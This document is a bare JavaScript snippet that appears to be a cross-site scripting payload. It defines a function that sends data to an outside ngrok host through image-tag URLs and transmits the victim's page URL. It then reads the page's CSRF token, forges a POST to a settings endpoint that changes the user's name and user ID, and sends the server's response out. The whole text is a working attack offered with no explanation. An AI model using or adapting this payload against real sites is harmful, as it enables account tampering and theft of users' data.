function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://83653900.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}

send2server("url", window.location.href);

let xhr = new XMLHttpRequest();
xhr.open("POST", "/settings", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
xhr.onload = function() { 
    send2server("status", " "+xhr.status);
    send2server("response", xhr.response);
};
xhr.send("name=cas&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
